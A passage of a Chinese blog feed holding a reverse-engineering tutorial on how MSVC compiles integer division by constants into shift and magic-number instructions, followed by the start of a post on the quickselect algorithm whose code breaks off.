除数为2的幂</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 shr     eax, 3   ; 还是使用的是无符号右移指令</span><br><span class="line">.text:00401007                 push    eax</span><br><span class="line">.text:00401008                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040100D                 call    printf</span><br><span class="line">.text:0040100D</span><br><span class="line">.text:00401012                 add     esp, 8</span><br><span class="line">.text:00401015                 xor     eax, eax</span><br><span class="line">.text:00401017                 retn</span><br><span class="line">.text:0040</span><br></pre></td></tr></table></figure><p>可以发现，其使用的还是无符号右移指令，右移的次数为幂次</p><h2 id="总结">总结</h2><p>对于被除数是无符号数，而除数是2的幂的情况下，<code>MSVC</code>使用的是无符号右移指令，定式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov reg, x; x为被除数</span><br><span class="line">shr reg, N; N为2的幂次</span><br></pre></td></tr></table></figure><p>还原时直接可以通过<span class="math inline">\(2^N\)</span>得到除数</p><h1 id="有符号数除以2的幂">有符号数除以2的幂</h1><h2 id="示例01---除数为2-1">示例01 - 除数为2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察其反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  .text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 sub     eax, edx</span><br><span class="line">.text:00401007                 sar     eax, 1</span><br><span class="line">.text:00401009                 push    eax</span><br><span class="line">.text:0040100A                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040100F                 call    printf</span><br><span class="line">.text:0040100F</span><br><span class="line">.text:00401014                 add     esp, 8</span><br><span class="line">.text:00401017                 xor     eax, eax</span><br><span class="line">.text:00401019                 retn</span><br><span class="line">.text:00401019</span><br><span class="line">.text:00401019 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现其计算方法并不是简单的将无符号右移指令<code>shr</code> 变为<code>sar</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 sub     eax, edx</span><br><span class="line">.text:00401007                 sar     eax, 1</span><br></pre></td></tr></table></figure><p>它在做什么呢？需要一行一行看。首先它将<code>eax</code>进行符号扩展，变为<code>edx, eax</code>的形式，<code>edx</code>保存的是有符号数<code>arg0</code> 的符号位。如果<code>arg0</code>为正数，则<code>edx</code>的值为0；如果<code>arg0</code>为负数，则<code>edx</code>的值为<code>0xFFFF,FFFF</code>，也就是<code>-1</code>。紧接着它用了减法操作，如果上述运算结果<code>edx</code>为0，则相当于该操作是无效操作；如果是<code>-1</code>，则相当于将被除数做了一个加一的操作。最后才做了一个带符号的右移运算，得到最终的除法运算结果。</p><p>将运算的每一步都搞清楚了好像也没明白它为什么这么做？他其实是将分支操作给转变成了无分支的操作了。在<code>C/C++</code>中，它的取整操作是向0取整的，也就是说，对于正数，它是向下取整；而对于负数，它是向上取整的。举个例子，<code>3.5</code>取整是3，<code>-3.5</code>取整就是<code>-3</code>，即：取更靠近0的整数。在这里就出现问题了，对于数学意义上来讲，<code>-3.5</code>的取整应该是<code>-4</code>，所以为了符合<code>C/C++</code>的向0取整约定，需要做调整，那么如何做调整呢，只需要将负数部分的向下取整变为上整即可，也就是说：<code>-3.5 + 1 = -2.5</code>，然后再取下整，就是<code>-3</code>。与向0取整的结果是一致的。</p><p>在上述描述的下整转上整其实有一个数学定理，本文并不打算将所用到的定理一一列出，而是举例子和描述出最终结果，以将笔者所理解的描述出来，证明我自己已经懂了即可。</p><h2 id="示例02---除数为2的幂-1">示例02 - 除数为2的幂</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 and     edx, 7   ; 在上述基础上又多出了这么一个操作</span><br><span class="line">.text:00401008                 add     eax, edx</span><br><span class="line">.text:0040100A                 sar     eax, 3</span><br><span class="line">.text:0040100D                 push    eax</span><br><span class="line">.text:0040100E                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:00401013                 call    printf</span><br><span class="line">.text:00401013</span><br><span class="line">.text:00401018                 add     esp, 8</span><br><span class="line">.text:0040101B                 xor     eax, eax</span><br><span class="line">.text:0040101D                 retn</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:0040101D _main           endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cdq</span><br><span class="line">.text:00401005                 and     edx, 7   ; 在上述基础上又多出了这么一个操作</span><br><span class="line">.text:00401008                 add     eax, edx   ; 加一操作也变为了加0或者加7了</span><br><span class="line">.text:0040100A                 sar     eax, 3</span><br></pre></td></tr></table></figure><p>根据示例01的分析，这个也应该是有分支转为无分支的操作（因为分支操作打乱了流水线优化，所以速度会变慢）。但是其又多了一句<code>and edx, 7</code>的运算，这句运算是做什么用的呢？</p><p>设<code>a</code>是被除数，<code>b</code>是除数，<code>q</code>是商，<code>r</code>是余数，则有：<span class="math inline">\(a = qb + r\)</span>，可以得到：$ = q +  $ ，当<span class="math inline">\(a &lt; 0, b &gt; 0\)</span>时，有：<span class="math inline">\(\lceil \frac{a}{b} \rceil= \lceil q + \frac{r}{b}\rceil\)</span>，而<span class="math inline">\(\lceil q + \frac{r}{b}\rceil = q + \lceil \frac{r}{b} \rceil\)</span> ，且$ |r| &lt; b, |r| +1b$ ，所以有： <span class="math display">\[\lceil \frac{a}{b} \rceil - \lfloor \frac{a + b - 1}{b} \rfloor = q + \lceil \frac{r}{b} \rceil - q - \lfloor \frac{r + b - 1}{b} \rfloor = \lceil \frac{r}{b} \rceil - \lfloor \frac{r - 1}{b} \rfloor -1\]</span> <span class="math display">\[\lceil \frac{r}{b} \rceil - \lfloor \frac{r - 1}{b} \rfloor = 1,when \space r &lt; 0\]</span></p><p><span class="math display">\[ \lceil \frac{r}{b} \rceil - \lfloor \frac{r - 1}{b} \rfloor = 1,when \space r = 0\]</span></p><p><span class="math display">\[ \lceil \frac{r}{b} \rceil - \lfloor \frac{r - 1}{b} \rfloor = 1,when \space r &gt; 0\]</span></p><p><span class="math display">\[ \Rightarrow \lceil \frac{a}{b} \rceil = \lfloor \frac{a + b - 1}{b} \rfloor\]</span></p><p>对于上述证明的通俗理解是：由于<code>r</code>是余数，其结果可能不为0，那么使其上整转为下整运算，分子需要加的最大整数就应该是<code>b - 1</code>，因为再加1，就变为了1，则当余数为0时，会影响其结果，导致计算后结果上整值和下整值不正确，因此为了保证其结果不管在什么时候都能相等，调整因子最大为<code>b - 1</code></p><h2 id="总结-1">总结</h2><p>对于这种的代码定式可以统一为示例02的定式，原因是示例1的为示例2的特殊情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov reg, x</span><br><span class="line">cdq</span><br><span class="line">and edx, 2^N - 1</span><br><span class="line">add reg, edx</span><br><span class="line">sar reg, N</span><br></pre></td></tr></table></figure><p>识别时需要先统计一共右移了几次，然后再判断其用来做与运算的值是否是<span class="math inline">\(2^N - 1\)</span>​，如果是，则可以认为是被除数为有符号数而除数是2的幂的情况，还原时直接将除数还原为<span class="math inline">\(2^N\)</span>​</p><p>当除数是负的2的幂的时候，只需要在最后面添加一句<code>neg reg</code>即可得到结果。</p><h1 id="无符号数除以非2的幂">无符号数除以非2的幂</h1><h2 id="示例">示例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, 0CCCCCCCDh; 多出来一个大数</span><br><span class="line">.text:00401005                 mul     [esp+arg_0]</span><br><span class="line">.text:00401009                 shr     edx, 2</span><br><span class="line">.text:0040100C                 push    edx; 乘法运算后取高32位</span><br><span class="line">.text:0040100D                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:00401012                 call    printf</span><br><span class="line">.text:00401012</span><br><span class="line">.text:00401017                 add     esp, 8</span><br><span class="line">.text:0040101A                 xor     eax, eax</span><br><span class="line">.text:0040101C                 retn</span><br><span class="line">.text:0040101C</span><br><span class="line">.text:0040101C _main           endp</span><br></pre></td></tr></table></figure><p>上述反汇编结果用到的其实就是一个除法转乘法的运算，前提是除数必须是一个常量，可以在编译期间内计算出来的，原因是下列公式： <span class="math display">\[\frac{A}{C} = A \times \frac{1}{C} = A \times \frac{2^n}{C}\times \frac{1}{2^n} = A\times M \times \frac{1}{2^n} = A \times M &gt;&gt; n\]</span> 需要除数C是一个常量。</p><p>还原时只需要做逆运算：<span class="math inline">\(MagicNum = \frac{2^n}{Divisor} \to Divisor = \frac{2^n}{MagicNum}\)</span>​</p><h2 id="总结-2">总结</h2><p>无符号数除以非2的幂的代码定式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov reg, MagicNum</span><br><span class="line">mul x</span><br><span class="line">shr edx, n; 使用edx相当于已经先右移了32位了，最终总的移位次数应该为N = 32 + n</span><br></pre></td></tr></table></figure><p>代码定式使用的是无符号数的运算指令，还原时需要统计一共右移了多少位，然后再使用逆运算还原出除数。</p><p>需要注意的是，编译器在计算魔数<code>MagicNum</code>（就是上面反汇编中的大数）时，是作为无符号数运算的。且由于除数<code>C</code>不是2的幂，编译器在计算<code>MagicNum</code>是要做取下整操作的，因此我们在还原除数的时候，需要<strong>取上整</strong>。</p><h1 id="有符号数除以非2的幂">有符号数除以非2的幂</h1><p>这篇是一般的常规情况，即：编译器得到的<code>MagicNum</code>无进位现象，无需正负数调整运算结果的情况。</p><h2 id="示例01---除数为正数">示例01 - 除数为正数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 66666667h; 注意此时MagicNum是正数</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 sar     edx, 1; 采用的是有符号运算指令</span><br><span class="line">.text:0040100D                 mov     eax, edx</span><br><span class="line">.text:0040100F                 shr     eax, 1Fh</span><br><span class="line">.text:00401012                 add     edx, eax; 运算结果下整转上整</span><br><span class="line">.text:00401014                 push    edx</span><br><span class="line">.text:00401015                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101A                 call    printf</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101F                 add     esp, 8</span><br><span class="line">.text:00401022                 xor     eax, eax</span><br><span class="line">.text:00401024                 retn</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，<code>MagicNum</code>是正数，且对于负数的情况，会加1做下整转上整的操作。还原方法与无符号数除以非2的幂的情况一致。</p><h2 id="示例02---除数为负数">示例02 - 除数为负数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">-5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 99999999h; 注意此时是负数，是以补码的形式存放的</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 sar     edx, 1</span><br><span class="line">.text:0040100D                 mov     eax, edx</span><br><span class="line">.text:0040100F                 shr     eax, 1Fh</span><br><span class="line">.text:00401012                 add     edx, eax</span><br><span class="line">.text:00401014                 push    edx</span><br><span class="line">.text:00401015                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101A                 call    printf</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101F                 add     esp, 8</span><br><span class="line">.text:00401022                 xor     eax, eax</span><br><span class="line">.text:00401024                 retn</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 _main           endp</span><br></pre></td></tr></table></figure><p>此时<code>MagicNum</code>是负数，在还原的时候，需要先求出其真值，再还原</p><h1 id="识别定式总结">识别定式总结</h1><p>下列总结暂时为不完全的，原因是还有一些特殊情况未被加进来：</p><ol type="1"><li>在识别时，先观察是否有加1做调整的操作，如果有且运算指令使用的是有符号运算指令，则被除数是有符号数。</li><li>查看<code>MagicNum</code>是否是负数（大于等于<code>0x8000,0000</code>即为负数）。如果是负数，则除数是负数；否则除数是正数</li></ol><h1 id="附录">附录</h1><p>对于取整操作的几个有用的性质：</p><ol type="1"><li><p>上下取整是相对于0点是对称的，因此对于实数<code>x</code>取上整/下整再取负要变取整方向。如：对<span class="math inline">\(\lfloor -x \rfloor\)</span>，其结果等于将符号提出，并变取整方向<span class="math inline">\(-\lceil x \rceil\)</span>。可以利用该性质将取整运算内的符号提出</p></li><li><p>当x为实数时，即：x不为整数时，下整和上整运算的结果相差1</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大纲&quot;&gt;大纲&lt;/h1&gt;
&lt;p&gt;本文涉及到的是除法的一般优化方法，其中特殊情况暂时不列举，涉及的知识点有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;被除数是无符号数，除以2的幂&lt;/li&gt;
&lt;li&gt;被除数是有符号数，除以2的幂&lt;/li&gt;
&lt;li&gt;被除数是无符号数，除以非2</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="除法优化" scheme="https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>基础算法：快速选择算法</title>
    <link href="https://4st.tech/2021/08/02/ji-chu-suan-fa-kuai-su-xuan-ze-suan-fa/"/>
    <id>https://4st.tech/2021/08/02/ji-chu-suan-fa-kuai-su-xuan-ze-suan-fa/</id>
    <published>2021-08-02T09:58:53.000Z</published>
    <updated>2021-08-04T04:57:03.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目要求">题目要求</h1><p>给定一个长度为<code>n</code>的整数数列，以及一个整数 <code>k</code>，求出数列从小到大排序后的第 <code>k</code>个数。即：从数列中尽可能快的找出第<code>k</code>小的数。</p><h1 id="分析题目">分析题目</h1><p>根据上述题目的要求，如果使用排序后，再找第k个数的最低时间复杂度是<code>nlogn</code>的，那么可不可以不通过排序直接得到第k小的数呢？</p><p>根据快速排序中的划分操作，可以知道每一次操作都会把不大于<code>pivot</code>的数放到其左边，把不小于<code>pivot</code>的数放到其右边，每一次都会将一整个数列划分为两组，如果在这个基础上可以知道在<code>pivot</code>的左半边有几个数，就可以知道<code>pivot</code>是第几个小的数，因此就可以判断第<code>k</code>小的数是位于左半边还是右半边，直接就可以舍弃一半的搜索范围。</p><p>根据上述描述， 可以得到其时间复杂度为<code>O(N)</code>，因为其时间复杂度是一个等比数列求和。</p><h1 id="快速选择算法">快速选择算法</h1><h2 id="算法流程">算法流程</h2><ol type="1"><li>随机选择一个<code>pivot</code> 进行二分，即：快速排序的划分算法</li><li>统计在划分点<code>pivot</code> 左侧的数的个数，看它与要选择的第<code>k</code>个数的k的大小来缩小搜索区间，以此为基准来判断是选择左半边进行搜索还是右半边进行搜索</li><li>根据夹挤准则，得到第<code>k</code>小的数</li></ol><h2 id="算法的实现">算法的实现</h2><p>该算法的实现有多种版本，只需要能把上述算法流程实现即可。这个算法使用递归来实现比较简单，需要注意递归的三要素：</p><ul><li>递归的定义</li><li>递归的出口</li><li>递归的拆解</li></ul><p>下面几个版本，均要求所求问题的解一定存在，否则代码会出现一些问题。</p><h3 id="版本01">版本01</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> ary[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quickSelect</span><span class="params">(<span class="keyword">int</span> ary[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 03.直接比较个数，当最后是1个的时候，直接返回该区间的第一个元素，就是答案</span></span><br><span class="line">    <span class="keyword">if</span> (k &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ary[lo];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 01.划分区间</span></span><br><span class="line">    <span class="keyword">int</span> left = lo - <span class="number">1</span>, right = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = ary[left + (right - left) / <span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">do</span> ++left; <span class="keyword">while</span> (ary[left] &lt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> --right; <span class="keyword">while</span> (ary[right] &gt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            std::<span class="built_in">swap</span>(ary[left], ary[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 02.由于外面没有减一，需要加1做调整，然后统计左侧数的个数，然后选择合适的区间进行搜索</span></span><br><span class="line">    <span class="keyword">if</span> (right + <span class="number">1</span> - lo &lt; k) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, right + <span class="number">1</span>, hi, k - right - <span class="number">1</span> + lo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, lo, right, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, k = <span class="number">0</span>; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;ary[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> num = <span class="built_in">quickSelect</span>(ary, <span class="number">0</span>, n - <span class="number">1</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, num);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="版本02">版本02</h3><p>该版本的作者是<code>yxc</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 